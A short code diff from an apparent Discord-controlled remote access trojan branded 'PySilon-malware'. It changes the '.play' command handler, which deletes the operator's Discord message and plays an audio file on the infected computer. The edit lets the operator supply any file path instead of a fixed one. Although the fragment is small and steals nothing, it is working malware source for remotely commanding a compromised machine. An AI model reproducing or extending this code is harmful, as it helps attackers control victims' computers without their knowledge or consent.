@@ -35,7 +35,7 @@ elif message.content[:5] == '.play':
     await message.delete()
     #.log Removed the message 
     if message.content.strip() == '.play':
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .play <audio-file.mp3>```', colour=discord.Colour.red())
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
     elif not message.content.endswith('.mp3'):
@@ -45,7 +45,7 @@ elif message.content[:5] == '.play':
     else:
         def play_audio():
             audio_file = message.content[6:]
-            audio_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\{audio_file}'
+            audio_file = audio_file.replace('\\','/')
             pygame.mixer.init()
             pygame.mixer.music.load(audio_file)
             pygame.mixer.music.play()
